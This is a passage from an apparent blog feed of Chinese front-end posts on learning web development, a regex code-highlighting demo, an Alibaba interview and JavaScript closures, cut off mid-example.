        <content type="html"><![CDATA[<p><span>　　上次</span><a title="如何培育新人" href="http://barretlee.github.com/freshmen-in-our-team/" target="_blank">如何培育新人</a><span>一文中也提到了自己学习前端的一些事儿，这两天几个新人问我当初是如何逐步学习前端的，因为以前也没做过什么记录，时间虽不长，记忆却开始模糊了，趁着还有些感觉，把这些往事都写下来。</span></p><p>　　之前看<a title="聂微东" href="http://www.cnblogs.com/Darren_code/" target="_blank">聂微东</a>大哥的文章，有一篇说到了他学习前端的经历(<a href="http://www.cnblogs.com/Darren_code/archive/2011/06/29/javascript-learn.html" target="_blank">说说我的web前端之路,分享些前端的好书</a>)，主要是推荐几本前端学习的书籍，童鞋们可以去瞅一瞅。我想分享的并不是这些书籍，而是学习前端技术的一些经历，当然，也包括一些书籍。</p><h3>初识前端</h3><p>　　第一次和前端打交道，是大一的时候。那时我的一个舍友加入了学校很有名誉的一个技术团队&mdash;&mdash;联创团队，在design组做美工设计和简单的网页开发。一天晚上，宿舍熄灯了，他从团队赶回来，拿着笔记本继续写着代码，我凑过去看了看，觉得好神奇，他竟然可以把一张图片变成网页！那个时候对前端还没有太大的感觉，加上舍友经常呆在团队，也很少回来，所以这种隐约的神奇感一直保留到大二。</p><p>　　一次，我吃完午饭，在学校操场附近溜达，看见韵苑路口搭起了几顶帐篷，一群人围在一起很hign的样子。于是，我也凑了过去...看着那群人正在玩XBox，突然觉得她应该是一个很有爱的团队，于是写了申请书，就这样我加入了<a title="网络应用研发中心" href="http://nadc.org.cn/" target="_blank">网络应用研发中心</a>（Network Application Development Center, NADC），那年我大二。</p><p>第一次新人任务，我认识了前端。</p><blockquote><p>　　我是大二加入NADC的，那时我是个新人，很新很新的人，连<code>HTML</code>、<code>CSS</code>是个什么东西我都不知道。我也不知道自己是否喜欢前端这块，后来团队给新人们布置了一些练习任务，任务内容是从四张psd图中任选一张，将其制作成HTML页面。任务到手，我十分迷茫，根本不知道该做哪些东西，记得那个星期我是常驻团队办公室。　　学长让我先看看 <strong>w3school</strong> 上HTML和CSS的相关内容，我埋着头看了两天，记得那两天，我坐着的时候是对着电脑，躺着的时候是拿着手机，一直在看网址上的内容，觉得很神奇，很好玩。大概是第三天开始，我动手写起了代码，代码写了差不多四天，没怎么休息，遇到了很多奇怪的问题。一个星期之后，我完成了人生的第一个页面<a title="第一次尝试做网页" href="http://qianduannotes.duapp.com/first/index.html" target="_blank">戳我</a>。</p></blockquote><h3>了解前端</h3><p>　　很多人问我是做什么的，我回答，前端，大多数人听着会一头雾水，你要问我前端是什么，我现在还是不好给出一个明确的回答。前端要学的东西太多了，在给新人的第一培训中，我说了这些：</p><p><img src="https://images.cnitblog.com/blog/387325/201310/31164537-58d37feb00254a4681b66f541d858856.jpg" alt=""></p><p>　　但是前端远不止这些东西，在这里我想说说看书的重要性。</p><p>　　我看过很多书，上面聂微东大哥说的书我在大三的时候就读过好几遍了，尤其是<code>《javascript权威指南》</code>，这本书第四版我看过四遍，第五版看过两遍，淘宝前端团队的第六版我看过一遍，现在还在读。我读书的目的是为了去了解整个前端以及他所用到的技术，这个很重要。我们学校有两个图书馆，我住在东边，所以经常会跑到东校区图书馆借阅一些书籍，去一趟图书馆就会带回来七八本书，两年下来，图书馆第四层前端相关的一百多本书籍基本被我一览无余，我不敢说自己对看到的那些知识都掌握了，但是我至少知道整个前端的发展历程，也学会了前端编码的基本技能。</p><p>　　一本书写下来，作者需要花很大的功夫去查阅文献，即便写得再烂，也是一个人思想的精华，也有很多值得借鉴的地方，所有开始你的阅览群书之旅吧！这是我在图书馆看过的部分书籍的<strong>书单</strong>：<a title="豆瓣书籍" href="http://book.douban.com/people/hustskyking/collect" target="_blank">豆瓣读书</a>，这里只是一部分，后来看过的书名也都忘记了，没有继续补上。</p><p>读书绝不是唯一了解前端的途径。因为这个网络信息太多太复杂，不好把握，如果没有目标地去搜索，很有得到令人满意的结果。我们可以先从书中找到自己的兴趣，再去网络上学习，这样会更加有效率。</p><h3>社区交流</h3><p>　　学习CSS，我印象最深的就是不停的写，不知道写了多少个DEMO，也记不清写了多少个网站的页面（包括学校的，班级的，外面小公司的，仿站的，学习任务中的...），每次都写到吐，每次都是起床开始写、晚上熄灯了还在写，好多次都是熬到第二天七八点。<code>或许你会我说太拼命，但我觉得成长是伴随着痛苦的！</code>这些任务很多情况下都是团队主管安排给我的，我这个人好胜心和展示欲比较强，不管他给我的是一个页面还是一个网站的所有页面，我都会在三天之内完成，然后交给他，让他对我做一些评价，提一些学习意见，然后重构代码，然后提交给他看，直到他满意为止。</p><p>　　那段时间基本上没有白天黑夜，总感觉一天24个小时太少，现在想来，我收获的真是太多了！现在看到一个页面，扫一眼，基本知道整个结构，该用哪些标签哪些属性，也约摸着可以比较准确的说出完成这个页面要多长时间。这是我学习CSS的经历。</p><p>　　学习Javascript就不像上面那样通过无数的练习提高技能，JS的内容太多，覆盖面太广，有时候一个bug可以让你调试几天（对初学者）。看过很多相关的JS书籍之后，对一些基本的东西有了比较全面的了解，但是可以实践的场景却不是很多，至少不能发挥所学，JS涉及的面太广。也不知道是什么时候，我喜欢上了帮人解决问题，去百度贴吧，百度知道，论坛，社区，QQ群等等，每天多进程的去找问题。</p><p>　　帮人解决问题是一件非常愉快而且有收益的事情，看到了自己会的东西，把想法说出来，说给大家听，比你\牛B"的人会指出你回答中的错误，这是已经互动学习。其实更多的情况是你对别人提出的问题也想不出解决方案，这个时候也正是一次学习的大好机会，我一般是这样做的：搜索相关内容，阅读别人写的博客内容（你想到的问题，网络上已经有人想到过，并且已经给出了解答，这也是知识共享的好处），如果在阅读时遇到了不懂的生词或者技术，继续去搜索，要把一个问题涉及到的周边问题都搞清楚，这才算是深入学习！</p><p>解答问题的过程中，你还可以去结实一些朋友，有些朋友的技术水平已经相当高了，比如<a title="张鑫旭新浪微博" href="http://weibo.com/zhangxinxu" target="_blank">@张鑫旭</a>，<a title="薛端阳新浪微博" href="http://weibo.com/u/1467730620" target="_blank">薛端阳</a>，<a title="玉伯也叫神雕的新浪微博" href="http://weibo.com/lifesinger" target="_blank">@玉伯</a>等等，你可以去结实他们，向他们请教问题，跟他们去交流。</p><h3>吃透一个知识点</h3><p>　　上面也说了怎么去解决一个问题，如何吃透一个知识点，这个也需要拿出来谈一谈。有些网站的内容是比较有权威性质的，比如<a href="http://www.whatwg.org/" target="_blank">http://www.whatwg.org/</a>、<a href="//developer.mozilla.org/" target="_blank">//developer.mozilla.org/</a>、<a href="http://www.w3.org/" target="_blank">http://www.w3.org/</a>等，如果你对这些网站比较熟悉而且英文水平还行的话，建议直接去查找你要的答案，一定可以找到（不过很难找）。</p><p>　　要弄清楚这个知识点包含哪些关键词，这样在网络上搜到的结果才是靠谱的，很多人真的不会搜索！大学有一门课程叫做<code>文件情报检索</code>，感兴趣的童鞋可以去选修这门课，我这里也有这门课程的相关PPT，可以给我邮件(<a href="mailto:barret.china@gmail.com" target="_blank">barret.china@gmail.com</a>)。</p><h3>博客</h3><p>　　我写了两年博客了，刚开始主要是摘录、收藏、转载，看到自己觉得不错的东西，拿过来当做是笔记。最开始我是在Qzone上写，后来，发现有点傻，Qzone根本不是写博客的地儿，后来改到了点点网，再接着是博客园，再接着是github，以后可能还会换。为什么会有这么一个转变，阮一峰老师<a title="喜欢写Blog的人，会经历三个阶段" href="http://www.ruanyifeng.com/blog/2012/08/blogging_with_jekyll.html" target="_blank">一篇文章</a>说了这样的话：</p><blockquote><p>喜欢写Blog的人，会经历三个阶段。</p><ul><li>第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。</li><li>第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。</li><li>第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。</li></ul></blockquote><p>　喜欢分享的人都会找到一种途径去分享自己觉得不错的东西，博客一种很直观的方式。我曾经写过的东西：</p><ul><li>Qzone</li><li>点点网 <a href="http://qianduan-notes.diandian.com/" target="_blank">http://qianduan-notes.diandian.com/</a></li><li>博客园 <a href="http://hustskyking.cnblogs.com/" target="_blank">http://hustskyking.cnblogs.com/</a></li><li>现在的&nbsp;<a title="github pages" href="http://barretlee.github.io" target="_blank">github pages</a></li></ul><p>我现在就是通过博客在分享自己的东西，网络上成千上万的人都在干同样的事情，关于<a title="为什么要写技术博客" href="http://www.cnblogs.com/vamei/archive/2012/11/17/2774208.html" target="_blank">为什么要写技术博客</a>，<a title="技术文章是怎样炼成的？" href="http://www.cnblogs.com/baochuan/archive/2012/04/13/2445140.html" target="_blank">如何写技术博客</a>，很多前辈们都写了相关的文章，可以去看一看。</p><h3>瞄准公司</h3><p>　　对学生来说，学技术只是一种兴趣。我一直对团队新成员灌输这样的思想，要把你们的技术发展成一门特长，兴趣停留的层次太低了，你很难接触到你所热衷的东西的最有趣的的部分。但对于那些想从事这方面工作的人来说，你不仅要把这个兴趣发展为特长，更重要的是发展成你的职业特长，全方位地了解这个行业。</p><p>　　因为自己团队很多学长学姐都进了很多不错的互联网大公司，所以最开始我就给自己定下了一个目标，我也要去这些大公司！（有点像高三时候的性格，我也要进好学校！） 所以当自己对前端有一定程度的了解之后，我开始去网上查看各公司对人才的招聘要求。刚从百度上面扒过来的（Web前端研发工程师【校招】）：</p><blockquote><p><strong>工作职责：</strong></p><ul><li><p>百度各产品Web前端研发</p></li><li><p>百度各产品易用性改进和界面技术优化</p></li><li><p>Web前沿技术研究和新技术调研</p><p><strong>职位要求：</strong></p></li><li><p>精通JavaScript、Ajax等Web开发技术</p></li><li><p>精通HTML&#x2F;XHTML、CSS等网页制作技术，熟悉页面架构和布局 </p></li><li><p>熟悉W3C标准，对表现与数据分离、Web语义化等有深刻理解 </p></li><li><p>对互联网产品和Web技术有强烈兴趣，有优秀的学习能力和强烈的进取心 </p></li><li><p>具有良好的沟通能力和团队合作精神、优秀的分析问题和解决问题的能力</p><p><strong> 具有以下能力者优先考虑： </strong></p></li><li><p>具有Mobile WEB&#x2F;WAP、HTML5&#x2F;CSS3、nodejs、Flash开发经验 </p></li><li><p>精通一种模板语言（Smarty、Velocity、Django等） </p></li><li><p>熟悉Linux平台，掌握一种后端开发语言（PHP&#x2F;Java&#x2F;C&#x2F;C++&#x2F;python等） </p></li><li><p>有前端性能优化经验</p></li><li><p>具有一定的软件工程意识，对数据结构和算法设计有充分理解</p></blockquote><p>　　对着这些要求，睁大眼睛看看自己，还缺那些，那些还做的不够，我相信你很快就有了前进的方向了！我以前也是对着这些点学习的，所以很容易得到那些公司的认可。后来也去看了下facebook的一些要求（Software Engineer- Front End）：</p><blockquote><p>Are you passionate about building UI to help those around you be more effective? What about building UI that your peers use daily and can1t wait for your next feature to be released? Facebook is seeking an experienced Front End Engineer to build the next generation UI for our infrastructure layer, to control hundreds of thousands of services and help our engineers digest the Terabytes of stored data. This is a full-time position based in our office in Palo Alto.</p><p><strong>Responsibilities</strong></p></li><li><p>Design and build user interface and data visualization for engineers to control and monitor services and servers</p></li><li><p>Code primarily in PHP, JavaScript and CSS</p></li><li><p>Understand engineer requests and come up with designs for the user workflow</p></li><li><p>Participate in design and code reviews</p></li><li><p>Interact with other team members to incorporate their innovations and vice versa</p><p><strong>Requirements</strong></p></li><li><p>Over 3+ year experience with PHP and JavaScript</p></li><li><p>Experience with web technologies (HTML&#x2F;CSS&#x2F;JS)</p></li><li><p>2+ years of building interactive web applications</p></li><li><p>Passion for elegant and intuitive user interfaces</p></li><li><p>BS or MS degree in Computer Science or a related technical field</p></li></ul></blockquote><p>　　这些东西不仅是给你学习的方向，还给你学习的东西，对照着可以看到你离公司的门槛还有多少<sup>_^</sup></p><h3>细节和态度</h3><p>　　有段时间，自己很浮躁，觉得很多东西都会了。书看多了，你会发现很多书籍的内容都是差不多的，也没有太多吸引人的地方，于是怎么也看不下去了，走马观花，稍微撇两眼就把书扔了。这种状态我很可以理解！因为我也是经常处于这种状态。</p><p><code>　　有些东西需要去平品味，去思考</code>，以前的学习几乎就是把知识强硬灌输到脑海中，过了一段时间快要忘记了，再去看一遍，多看几遍印象就什么，但是这样学习方式是很痛苦的，而且效率也很低。现在的话，我会想，为什么他要这样设计，这样设计是否欠妥，是不是还有更优的解决方案... 尝试着去否定所谓的权威，这些理念都是人提出来的，谁都不能保证一个人的逻辑思维是十分完善和全面的，我们也是人，对他们提出质疑这是完全合理的，不要有任何觉得不妥的地方！</p><h3>前端资讯</h3><p>　　说说关注互联网的重要性。前面说我看过很多书，就目前来看，我对前端的认识依然是远远不够的，你要知道，一本稍微有内容的优秀的书籍写出来至少要一到两年时间，而且搞技术的人也不会全身心投入到著作中，他们也需要工作。所以你在书中，即便是最新出版的书中，看到的技术不会特别新了，至少落后了两到三年时间。</p><p>看老外们写的博客，每每看到博客日期的时候，都不禁感叹，我没见过的东西，人家在三年前就已经很熟练了。这就是我们跟那些技术先驱的差距，所以如果要了解这个行业的动向，一定要多关注前端资讯！</p><h3>前端构架</h3><p>　　很多公司都在研究一套属于自己的前端集成解决方案，如百度的<a title="FIS" href="http://fis.baidu.com/" target="_blank">FIS</a>，阿里的<a title="seajs" href="//github.com/seajs/seajs" target="_blank">seajs</a>等，也有很多牛人在研究自己的前端库、框架，如司徒正美的<a title="avalon" href="//github.com/RubyLouvre/avalon" target="_blank">avalon</a>，老赵的<a title="wind.js" href="//github.com/JeffreyZhao/jscex" target="_blank">wind.js</a>，cujojs的<a title="when.js" href="//github.com/cujojs/when" target="_blank">when.js</a>等等，看看这些人的博客，也会感叹，人家两三年前也开始搞起来了，代码写的也是相当出色的！</p><p>说这些东西，是为了说明，前端方面水很深，如果发现自己没啥事干了，这些东西一定会让你有所触动，也算是学到一定水平之后会主动去学习的东西。</p><h3>小结</h3><p>　　敲了一下午，手都敲疼了。</p><p>　　本文就当是对自己的一个自我介绍吧，谈了下我对前端学习的一些感受，每次面试都会被问到是如何学习前端的，回答多了感觉也忒无聊的- -</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转正则之highlight高亮</title>
      <link href="/blog/2013/10/07/cb-javascript-regexp/"/>
      <url>/blog/2013/10/07/cb-javascript-regexp/</url>
      
        <content type="html"><![CDATA[<p>　　程序员在编写代码的时候少不了和字符串以及\查询"打交道，两者的交集中有一个叫做正则表达式的的东西，这家伙用好了可以提高编程效率，用不好的话...你可以先去好好学一学。</p><p>　　关于正则的使用，举个简单的例子：</p><figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">var m = location.href.match(/(\w+:)\/&#123;0,3&#125;(<span class="comment">[^\/]</span>+)(?:(\/<span class="comment">[^\?#]</span>*))?(?:(\?<span class="comment">[^#]</span>+|.+))?(?:(#.*))?/);</span><br><span class="line">var res = &#123;</span><br><span class="line">    protocol: m<span class="comment">[1]</span>,</span><br><span class="line">    host: m<span class="comment">[2]</span>,</span><br><span class="line">    path: m<span class="comment">[3]</span>,</span><br><span class="line">    search: m<span class="comment">[4]</span>,</span><br><span class="line">    hash: m<span class="comment">[5]</span></span><br><span class="line">&#125;;</span><br><span class="line">console.log(res);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　憋了几分钟= =||，我也觉得这个正则不是特别好理解（红黑相间了，应该稍微清晰点），有些朋友可能不知道（?:content）是什么意思，还有类似（?!content）和(?=content)分组和前瞻的知识，建议去问问<a title="javascript 正则" href="http://www.baidu.com/s?wd=javascript+%E6%AD%A3%E5%88%99" target="_blank">度哥</a>和<a title="javascript 正则" href="//www.google.com.hk/search?q=javascript+%E6%AD%A3%E5%88%99" target="_blank">谷娘</a>。</p><h3><strong>一. 正则应用<strong>小</strong>DEMO示例</strong></h3><p>下面是一串随手写的代码，放在textarea中：</p><p><textarea id="barret-codes" readonly="readonly">/*** @author barret lee* @date   2013-10-06* @email  barret.china@gmail.com*/<p>&#x2F;&#x2F;outer var<br>var a &#x3D; “this id outer string”;</p><p>&#x2F;&#x2F;closure<br>function b() {<br>  &#x2F;&#x2F;inner var<br>  var a &#x3D; “this is inner string”;<br>  var g &#x3D; a.replace(&#x2F;this is inner string&#x2F;g, function() {<br>    return new Function(“&#x2F;<em>clousure</em>&#x2F;this.a”)();<br>  });</p><p>  &#x2F;**</p><ul><li>@description closure - regExp test</li><li>@author barret lee<br>  *&#x2F;<br>  function c() {<br>return {<br>  a: a,<br>  g: g<br>}<br>  }</li></ul><p>  return c;<br>}</p><p>var s &#x3D; b()(); &#x2F;&#x2F;s.a, s.g<br></textarea></p></p><p>正则匹配，处理上面那堆字符串的小DEMO：</p><div><div id="barret-container">&nbsp;</div><div id="barret-note"><a onclick="showBtn.autorun();return false;" href="javascript:void(0);">点击开始演示</a></div></div><p><strong>博客园引入个js文件还真罗嗦，有时候会报XSS（跨站脚本攻击）相关的错误，（如果木有正常显示，刷新下试试）。</strong></p><p><strong>如果还是没有，可以看另外一个demo：<a href="http://qianduannotes.sinaapp.com/highlight/" target="_blank">SAE/highlight</a></strong></p><p>跟着提示，下一步下一步多点几下，可以看出效果还是可以滴。主要是这里的正则略微的麻烦，处理一个色变得琢磨老半天。</p><p><em>P.S：上面这玩意儿只是一个小测试，代码相当不健壮，拿着学习正则练手～</em></p><h3><strong>二. 需要注意的地方</strong></h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>step config</span><br><span class="line">var config = &#123;</span><br><span class="line">    regs: [</span><br><span class="line">        <span class="regexp">/^\s+|\s+$/g</span>,</span><br><span class="line">        <span class="regexp">/([&quot;&#x27;])(?:\\.|[^\\\n])*?\1/g</span>,</span><br><span class="line">        <span class="regexp">/\/(?!\*|span).+\/(?!span)[gim]*/g</span>,</span><br><span class="line">        <span class="regexp">/(\/\/.*|\/\*[\S\s]+?\*\/)/g</span>,</span><br><span class="line">        <span class="regexp">/(\*\s*)(@\w+)(?=\s*)/g</span>,</span><br><span class="line">        <span class="regexp">/\b...\b/g</span></span><br><span class="line">    ],　　<span class="regexp">//</span>...&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这些正则我是分开来写的，主要是为了做上面那个demo，方便单步显示。但是把这些正则分开写是相当不合理的，放在textarea中的是一串没有任何标签的字符串，为了着色，每处理一个正则都会在codes中插入一些标签（我这里用的是span），当我们处理下一个正则的时候就必须得考虑上一步加入的标签，这样会很大程度提高开发难度，最好的做法是把这些正则都放到一坨，然后用|隔开：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">var reg = (/^\s+|<span class="string">\s+$/)</span>|<span class="string">(/([&quot;&#x27;])(?:\\.</span>|<span class="string">[^\\\n])*?\1/)</span>|<span class="string">(/\/(?!\*</span>|<span class="string">span).+\/(?!span)[gim]*/)</span>|<span class="string">(/(\/\/.*</span>|<span class="string">\/\*[\S\s]+?\*\/)/)</span>|<span class="string">(/(\*\s*)(@\w+)(?=\s*)/)</span>|<span class="string">(/\b(break</span>|<span class="string">continue</span>|<span class="string">do</span>|<span class="string">for</span>|<span class="string">in</span>|<span class="string">function</span>|<span class="string">if</span>|<span class="string">else</span>|<span class="string">return</span>|<span class="string">switch</span>|<span class="string">throw</span>|<span class="string">try</span>|<span class="string">catch</span>|<span class="string">finally</span>|<span class="string">var</span>|<span class="string">while</span>|<span class="string">with</span>|<span class="string">case</span>|<span class="string">new</span>|<span class="string">typeof</span>|<span class="string">instance</span>|<span class="string">delete</span>|<span class="string">void</span>|<span class="string">Object</span>|<span class="string">Array</span>|<span class="string">String</span>|<span class="string">Number</span>|<span class="string">Boolean</span>|<span class="string">Function</span>|<span class="string">RegExp</span>|<span class="string">Date</span>|<span class="string">Math</span>|<span class="string">window</span>|<span class="string">document</span>|<span class="string">navigator</span>|<span class="string">location</span>|<span class="string">true</span>|<span class="string">false</span>|<span class="string">null</span>|<span class="string">undefined</span>|<span class="string">NaN)\b)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>这样放的好处是可以直接</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">codes.<span class="built_in">replace</span>(reg, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> args = arguments;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一次性处理，不用担心插入标签影响最后的结果，因为标签是同一时间插入的，不会有干扰。</p><p>代码高亮插件highlight的基本原理也差不多，只不过他的容错机制和代码健壮性这块做的更加完善，我在代码里头加了一个配置文件，</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">var <span class="attr">colors</span> <span class="operator">=</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="symbol">    string:</span> <span class="string">&quot;#FFA0A0&quot;</span>,</span><br><span class="line"><span class="symbol">    reg:</span> <span class="string">&quot;#16E916&quot;</span>,</span><br><span class="line"><span class="symbol">    note:</span> <span class="string">&quot;#888&quot;</span>,</span><br><span class="line"><span class="symbol">    tag:</span> <span class="string">&quot;orange&quot;</span>,</span><br><span class="line"><span class="symbol">    keywords:</span> <span class="string">&quot;#B0B0FF&quot;</span></span><br><span class="line"><span class="punctuation">&#125;;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>按照自己的喜好，也可以加以修改，类似这样的扩展，我们在写代码的时候稍微注意下，多留几个接口就好了。（不过这些活儿干起来都还挺辛苦的～）</p><p>没有做成插件，也没这个必要，知道基本原理然后动手实践下就差不多了。</p><h3><strong>三. 小结</strong></h3><p>类似很多的前端模板，<a href="//github.com/aui/artTemplate/blob/master/template.js" target="_blank">artTemplate</a>，<a href="//github.com/wangxiao/BaiduTemplate/blob/master/baiduTemplate.js" target="_blank">baiduTemplate</a>等都是对正则表达式的绝伦应用，很值得去看看源码，好好钻研人家都考虑了那些容易出错的点，源码都不长，两三百行。了解一个大概比较容易，但是当自己动手的时候总会发现很多细节问题处理不好，我那上面几个正则就倒弄了半天= =</p><p>另外一个配色方案，随便弄的，戳这里<a href="http://qianduannotes.sinaapp.com/highlight/" target="_blank">SAE/highlight</a>。</p><p>正则表达式，用起来还是挺方便的。正则技能，你值得拥有～</p><script type="text/javascript" src="http://files.cnblogs.com/hustskyking/reg-demo.js?v=1"></script>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里面试的一点感受</title>
      <link href="/blog/2013/09/26/cb-mianshi-alibaba/"/>
      <url>/blog/2013/09/26/cb-mianshi-alibaba/</url>
      
        <content type="html"><![CDATA[<p>　　<strong>&lt;!-- [废话开始]</strong></p><p>　　<span>百度实习三个月，明天就要离职了，感觉还挺开心的，同事们都很照顾我，Boss也比较欣赏我，我很满足了。掐指一算，这大四其实也没几个月了，同事们都在感叹大学的那些事儿，也告诫我要好好享受大学最后的时光，我会好好把握！</span></p><p><span>　　离开之前呢，还挺幸运的，这几天阿里在各地招人，我也去试了一把，由于之前拿过阿里的实习offer，所以笔试就给免了，呵呵，也省得我再去做那些枯燥的笔试题。不过期间也有不少的坎坷，就不细说了= =</span></p><p><span>　　下午四点去北京大望路附近某个旮旯里头找alibaba。阿里给我的第一印象就是设计很给力，公司的橙色主题色也十分醒神，特别是那些HR美眉，虽说有些事情是她们的职责，表现出来的和蔼还是挺发自内心的，赞！刚去的时候，一堆HR在开会，应该是讨论招新的事情吧，全是妹纸= = 然后一个人磨叽磨叽的凑了过去，被人发现之后，HR老大停止了说话，然后所有人的目光投向了我，额。。。HR老大带我去了一个会议室，让我先等一下，说面试官还没到。</span></p><p>　　<strong>[废话结束]--&gt;</strong></p><p>&nbsp;&nbsp;</p><p>　　刚坐下不久，面试官到了，他告诉我他花名是"李牧"，表示不认识啊，囧。问我有没有写阿里的笔试题，当时就帮同事做了下，模糊记得自己也做了一份，然后他来了个干瞪眼，说："你自己做没做都不知道，那来这儿干嘛！"，语塞了几秒钟，回答说："我有收到不用笔试直接过来面试的短信= =||"。</p><p>　　先给了我四道题目，他趁我做题之际把我的博客和github都瞄了一通。面试题目都比较有深度，我觉得要构思几道不错的题目还挺难的，虽说记得原题，我就不贴出来了，就大概说说他都考核了哪些知识吧～</p><p>　　<strong>1. 值类型 引用类型的理解</strong>，如</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">&quot;x&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">a.x = <span class="number">2</span>;</span><br><span class="line">b.x;</span><br><span class="line"></span><br><span class="line">a = &#123;<span class="string">&quot;x&quot;</span>:<span class="number">3</span>&#125;;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(b.x);</span><br><span class="line">a.x == <span class="number">4</span>;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(b.x);</span><br></pre></td></tr></table></figure><p>　　算是比较基础，但是b.x的结果是多少，你就别弄错了。</p><p>　　<strong>2. 闭包+作用域链+单线程+垃圾回收</strong></p><p>　　问你对闭包中一些变量的生存期，闭包一些值如何才能够作用域链中获取，setTimeout函数的考核，GC的标记清理和循环计数等，算是些比较常见也比较容易出错的点。</p><p>　　<strong>3. 作用域+构造函数+设计模式+对"类"的深入理解</strong></p><p>　　虽说他给的就一道小题目，但是涉及的内容还挺多的，需要对一些基础东西有比较深刻的理解才能答好。</p><p>　　<strong>4. 原型链+继承+ES5+继承优化</strong></p><p>　　ES5中Object.create()函数，prototype，new Class()等之间的相互比较，坑很多，容易踩进去。</p><p>　　就这四道题目，考核的内容还是相当广泛的，如果你想临时看下前端知识，然后去阿里试试手，我看还是算了，很多东西真的需要有一定的知识积淀，对一些比较常用的东西要有深刻的理解才不会频频语塞，面试官都喜欢刨根问底，要是那个点没有掌握好，他可能会潜意识抓住这个空缺，把你问倒。不过李牧大哥人挺好的，没故意刁难我。走的时候听HR说他等级是P8，也不知道在阿里是个什么位置= =</p><p>　　我们目前是一群码农，但是要有点思想。拿着一本ECMAScript的规范，很少有人能够硬着头皮把书啃完，因为内容太生硬，太晦涩了。首先咱们应该抛开那种"权威就是标准"的意识，带着疑问和反问去了解别人的思想，我们脖子上的是人脑，不是磁盘，记东西这事应该让磁盘来做，我们需要做的是分析和思考，让这些数据展现出他们的价值，当然，也需要去记一点东西，不要一个splite函数还想着查文档，不要函数是什么还得去百度谷歌看定义，也需要有些基础知识的积淀。</p><p>　　奋斗吧，再不拼命我们就老了！</p><p>　　</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对闭包机制的深入理解</title>
      <link href="/blog/2013/09/23/cb-javascript-closure/"/>
      <url>/blog/2013/09/23/cb-javascript-closure/</url>
      
        <content type="html"><![CDATA[<p>　　对于JavaScript初学者来说，闭包是一个很神秘的东西，不管看多少遍，依旧搞不清楚闭包是什么，更不明白其内部是什么样的处理机制（更可恶的是每次面试都会被问到）。</p><p>　　说的含糊一点，闭包就是代码块和该代码块上下文（context）相互作用的产物。看一个例子：</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> <span class="params">()</span>&#123;</span><br><span class="line">        alert(++x); <span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = foo();</span><br><span class="line">bar();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　先问一个问题，这里到底谁是闭包？是foo还是那个匿名函数？</p><h3>闭包的产生原理</h3><p>　　在JavaScript中，函数可以用来分隔作用域，当foo执行（activation）的时候，产生了一个foo的动态作用域，然后这个动态作用域把变量x和那个return的匿名函数装（push到栈）了进去，一般情况下，当函数执行完毕时，它会自动销毁（pop出栈）内部产生的变量和函数，跳出这个作用域环境，返回到上一层（context）。但是在这里，由于foo作用域内部的变量和函数与它作用域外部的变量bar存在暧昧关系（bar引用了foo()的返回值），所以变量x和匿名函数没法从foo作用域中被销毁，于是也就产生了我们平时所说的闭包。刚才说的push到栈和pop出栈很已经显然不适用于闭包，这和栈的结构是相悖的，那么闭包是怎样的内存分配方式呢？这个我们后面再说。<strong>闭包既不是foo函数，也不是那个匿名函数，而是变量x、匿名函数、上下文环境三者一起同时存在的结果。</strong></p><p>　　闭包存在有这么<strong>两个条件</strong>：</p><ul><li>没有被创建它的上下文销毁</li><li>引用了自由变量（没有在函数块中定义，也没有从arguments中送入，如上匿名函数中的变量x，就是一个自由变量）</li></ul><p>　　说了这么多，再看看下面这个例子：</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    alert(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    foo(); <span class="comment">//1</span></span><br><span class="line">&#125;();</span><br><span 